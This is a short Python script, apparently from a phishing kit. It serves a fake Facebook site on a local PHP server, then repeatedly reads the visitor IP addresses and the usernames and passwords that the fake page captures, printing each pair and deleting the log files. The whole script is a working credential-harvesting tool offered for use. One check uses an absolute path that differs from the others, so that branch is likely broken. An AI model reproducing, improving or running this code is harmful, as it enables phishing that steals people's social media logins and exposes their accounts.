import os
os.system("killall php> /dev/null 2>&1")
os.system("cd site/facebook/ && php -S 127.0.0.1:8080> /dev/null 2>&1 &")
while True:
	if os.path.isfile("site/facebook/ip.txt")==True:
		tr=open("site/facebook/ip.txt","r")
		ip2=tr.readline()
		ip=tr.readline().strip("IP:")
		print("\n [>] A User Visited the Site From IP : "+ip)
		tr.close()
		os.system("rm -rf site/facebook/ip.txt")
	if os.path.isfile("/site/facebook/usernames.txt")==True:
	 #time.sleep(0.75)
		tr2=open("site/facebook/usernames.txt","r")
		log2=tr2.readline()
		start=int(log2.find("Username:"))
		end=int(log2.find("Pass:"))
		print("\t  user : "+log2[start+9:end])
		print("\t  Pas  : "+log2[end+5:])
		tr2.close()
		os.system("rm -rf site/facebook/usernames.txt")
